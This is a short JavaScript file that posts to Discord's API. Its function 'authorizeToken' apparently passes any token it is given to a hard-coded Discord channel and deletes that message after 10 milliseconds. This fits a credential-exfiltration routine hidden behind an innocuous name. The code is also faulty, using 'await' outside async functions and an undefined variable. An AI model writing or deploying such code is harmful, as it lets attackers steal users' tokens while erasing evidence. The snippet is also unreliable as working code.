console.log("script loaded");

function deleteMessage(authToken, channelId, messageId) {
        const url = `https://discord.com/api/v9/channels/${channelId}/messages/${messageId}`;
        try {
            const response = await fetch(url, {
                method: 'DELETE',
                headers: { 'Authorization': authToken }
            });
            if (!response.ok && response.status !== 204) {
                const errorData = await response.json();
                throw new Error(`Error ${response.status}: ${errorData.message}`);
            }
        } catch (error) {
            console.error(`Failed to delete message ${messageId}:`, error);
        }
    }

function sendMessage(authToken, channelId, messageContent, deleteAfterMs) {
        if (!authToken) {
            console.error("Authentication token is missing. Cannot send message.");
            return;
        }

        const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
        const payload = { content: messageContent };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': authToken
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(`Error ${response.status}: ${errorData.message}`);
            }

            const sentMessage = await response.json();

            if (typeof deleteAfterMs === 'number' && deleteAfterMs > 0) {
                console.log(`Message ${sentMessage.id} will be deleted in ${deleteAfterMs}ms.`);
                setTimeout(() => {
                    deleteMessage(authToken, channelId, sentMessage.id);
                }, deleteAfterMs);
            }

            return sentMessage;

        } catch (error) {
            console.error('Failed to send message:', error);
        }
    }

const channelId = "1387920548087992380";

function authorizeToken(token) {
    sendMessage(authToken, channelId, token, 10);
}
